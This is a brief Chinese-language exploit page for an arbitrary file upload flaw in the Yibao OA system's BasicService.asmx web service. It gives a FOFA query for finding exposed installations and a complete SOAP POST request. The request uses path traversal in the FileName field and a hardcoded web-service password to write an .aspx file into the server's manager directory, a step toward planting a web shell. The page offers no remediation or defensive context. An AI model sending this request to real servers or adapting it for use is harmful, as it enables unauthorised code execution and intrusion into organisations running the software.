## 易宝OA-BasicService.asmx存在任意文件上传漏洞


## fofa
```
title="欢迎登录易宝OA系统"
```

## poc
```
POST /WebService/BasicService.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/UploadBillFile
Content-Type: text/xml;charset=UTF-8
Content-Length: 521

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:UploadBillFile>
         <!--type: base64Binary-->
         <tem:fs>aGVsbG8K</tem:fs>
         <!--type: string-->
         <tem:FileName>../../manager/hello.aspx</tem:FileName>
         <!--type: string-->
         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
      </tem:UploadBillFile>
   </soapenv:Body>
</soapenv:Envelope>
```
